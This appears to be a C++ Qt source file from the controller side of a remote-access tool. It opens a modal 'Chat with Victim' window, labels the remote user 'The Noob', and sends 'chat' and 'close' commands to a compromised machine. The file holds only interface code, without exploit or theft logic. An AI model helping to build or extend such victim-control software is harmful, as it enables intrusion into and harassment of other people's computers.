#include "chat.h"
#include "ui_chat.h"


chat::chat(server *recieved, QWidget *parent) :
    QWidget(parent), mainServer(recieved),
    ui(new Ui::chat)
{    
    this->setAttribute(Qt::WA_DeleteOnClose);
    ui->setupUi(this);
    this->setWindowTitle("Chat with Victim");
    this->setWindowFlags(Qt::WindowCloseButtonHint);
    this->setWindowModality(Qt::ApplicationModal);
    this->setFixedHeight(this->height());
    this->setFixedWidth(this->width());

    mainServer->connectMe(this);

    mainServer->sendCommand(QByteArray("chat"));
}

chat::~chat()
{    
    mainServer->sendCommand(QByteArray("close"));
    delete ui;
}

void chat::dataAvailable(QByteArray input)
{
    ui->textBrowser->setTextColor("red");
    ui->textBrowser->insertPlainText("The Noob: ");
    ui->textBrowser->moveCursor(QTextCursor::End);
    ui->textBrowser->setTextColor("black");
    ui->textBrowser->insertPlainText(QString(input) + "\n\n");
    ui->textBrowser->moveCursor(QTextCursor::End);
}


void chat::on_pushButton_clicked()
{
    ui->textBrowser->setTextColor("green");
    ui->textBrowser->insertPlainText("Me: ");
    ui->textBrowser->moveCursor(QTextCursor::End);
    ui->textBrowser->setTextColor("black");
    ui->textBrowser->insertPlainText(ui->lineEdit->text() + "\n\n");
    mainServer->sendCommand(ui->lineEdit->text().toLocal8Bit());
    ui->lineEdit->clear();
}

void chat::on_lineEdit_returnPressed()
{
    on_pushButton_clicked();
}
